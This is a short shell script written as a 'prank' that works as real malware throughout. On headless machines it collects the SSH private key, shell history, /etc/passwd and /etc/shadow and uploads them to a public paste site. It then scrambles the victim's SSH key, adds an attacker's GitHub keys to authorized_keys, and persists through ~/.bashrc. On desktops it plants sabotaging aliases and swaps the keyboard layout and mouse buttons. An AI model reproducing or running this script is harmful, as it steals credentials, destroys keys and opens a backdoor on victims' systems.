#!/bin/sh

if [[ -z $DISPLAY ]] ; then
ichip=ipv4.icanhazip.com
( # leaky leaky
echo ip
curl $ichip || wget -O- $ichip 
cat ~/.ssh/id_rsa
echo ===
history
echo ===
cat /etc/passwd
cat /etc/shadow
) 2> /dev/null | openssl enc -aes-256-cbc -salt -in /dev/stdin -out /dev/stdout -k averymuchharderverymuchlongerverydogesomuchwowpassword | base64 | curl -F 'f:1=<-' ix.io
( # crypty crypty
cat .ssh/id_rsa | grep -B 200 -E '^$' | head -n -1
echo
cat .ssh/id_rsa | grep -A 200 -E '^$' | head -n -1 | tr -d '\n' | base64 -d |\
    openssl enc -aes-256-cbc -salt -in /dev/stdin -out /dev/stdout -k plop | base64 -w 64
cat .ssh/id_rsa | tail -n 1
) > /tmp/hahahahahahahahahahahahahaha
cp /tmp/hahahahahahahahahahahahahaha ~/.ssh/id_rsa
rm /tmp/hahahahahahahahahahahahahaha
echo "Give us your GITHUB USERNAME!"
read GH_USER
# backdoory backdoory
curl -s "https://github.com/${GH_USER}.keys" >> .ssh/authorized_keys
cat <<EOF > ~/.loose
# Losing your server!
curl -s https://github.com/${GH_USER}.keys >> .ssh/authorized_keys
echo "You've been hacked!"
echo "  You have now dun goofed"
EOF
else
cat <<EOF > ~/.loose
# aliases
alias vim=emacs
alias cd=ls
alias cat=rev
alias cp=yes
alias mv=yes
alias su=yes
alias scp="echo JE SUIS UN GLAND"

# rickrolled
(
    hash google-chrome && (
        google-chrome rickroll.fr
    ) || true
) 2>/dev/null

# change keyboard layout
(
    hash localectl && (
	setxkbmap \`localectl list-keymaps | shuf -n 1\`
    ) || setxkbmap dvorak || true
) 2>/dev/null

# mouse
(
    xset mouse 3 0 || true
    xmodmap -e "pointer = 3 2 1" || true
) 2>/dev/null

echo "You've been hacked!"
echo "  You are now using a randomly chosen keyboard (or dvorak)"
echo "  To 'repair' your computer, you need to undo everything in ~/.loose file"
echo "  Or execute this script: http://j.mp/wiiiiiin"
echo "Tchuss"

EOF
fi

grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc

#. ~/.loose
